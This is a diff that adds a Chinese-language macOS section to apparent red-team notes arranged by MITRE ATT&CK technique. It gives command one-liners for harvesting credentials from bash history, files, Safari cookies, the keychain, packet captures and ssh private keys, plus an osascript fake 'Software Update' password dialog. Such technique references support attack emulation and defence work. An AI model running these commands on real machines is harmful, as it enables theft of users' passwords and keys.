@@ -129,3 +129,101 @@ foreach($member in $fmm) {
 没有复现
 ### T1110 - Brute Force
 没什么说的,就是爆破
+
+## macos
+
+## T1552.003 - Bash History
+
+红队可以根据bash历史命令查找一些可用的口令
+
+```
+cat #{bash_history_filename} | grep -e '-p ' -e 'pass' -e 'ssh' > #{output_file}
+```
+
+
+
+## T1552.001 - Credentials In Files
+
+红队可以在受害者机器中查找存储在文件里的Credentials,Demo如下
+
+###### Demo1 使用LaZagne来进行凭据查找
+
+```
+python2 laZagne.py all
+```
+
+###### Demo2 通过grep命令查找文本的特殊字段
+
+```
+grep -ri password #{file_path}
+```
+
+
+
+## T1555.003 - Credentials from Web Browsers
+
+红队可以在通常使用的浏览器中查找凭据,Demo如下
+
+###### Demo1 查找Safari的cookie
+
+这个demo使用grep命令来查找Safari的cookie，这项技术在CookieMiner病毒中曾经运用过
+
+```
+cd ~/Library/Cookies
+grep -q "#{search_string}" "Cookies.binarycookies"
+```
+
+
+
+## T1056.002 - GUI Input Capture
+
+红队可以制作一个伪装的GUI来诱导用户输入凭证，Demo如下
+
+###### Demo1 AppleScript - Prompt User for Password
+
+```
+osascript -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to display dialog "Software Update requires that you type your password to apply changes." & return & return  default answer "" with icon 1 with hidden answer with title "Software Update"'
+```
+
+
+
+## T1555.001 - Keychain
+
+Security是Mac系统中钥匙串和安全模块的命令行管理工具，（图形化工具为Keychain  Access.app）。钥匙串（Keychain）实质上就是一个用于存放证书、密钥、密码等安全认证实体的仓库，在计算机中保存为一个.keychain的文件，默认存放在以下目录中（使用这几个目录中的钥匙串时不需要写路径，直接用文件名即可，Security工具会自动搜索）：
+
+- ~/Library/Keychains/
+- /Library/Keychains/
+- /Network/Library/Keychains/
+
+可以使用security命令查看keychain
+
+```
+security -h
+security find-certificate -a -p > #{cert_export}
+security import #{cert_export} -k
+```
+
+
+
+## T1040 - Network Sniffing
+
+红队使用网络抓包获取一些用户凭证,其实就是简单的抓包，Demo如下
+
+```
+sudo tcpdump -c 5 -nnni #{interface}    
+if [ -x "$(command -v tshark)" ]; then sudo tshark -c 5 -i #{interface}; fi;
+```
+
+
+
+## T1552.004 - Private Keys
+
+私钥和证书可以进行权限验证,加解密进行数字签名.攻击者可用这些进行权限维持或者解密文件.通常密钥和证书的后缀是`.key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc.相关的查找Demo如下
+
+###### Demo1 在linux中查找ssh私钥
+
+```
+find / -name id_rsa >> #{output_file}
+find / -name id_dsa >> #{output_file}
+```
+
